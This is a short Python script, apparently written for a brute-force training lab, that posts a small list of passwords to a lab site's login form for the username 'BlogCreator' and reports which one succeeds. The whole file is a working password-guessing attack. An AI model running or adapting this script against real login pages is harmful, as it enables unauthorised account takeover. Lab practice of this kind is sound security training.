import requests
from icecream import ic
url = 'http://lap3-brute_force.labs-is-here.online/login'
passwords = [
    '123456', 'adminPass123'
]

for pwd in passwords:
    data = {
        "username": "BlogCreator",    # или другой известный username
        "password": pwd
    }
    r = requests.post(url, data=data, allow_redirects=True)
    if "Login successful" in r.text:
        print(f"[+] Success! Password found: {pwd}")
        break
    else:
        print(f"[-] Tried: {pwd}")
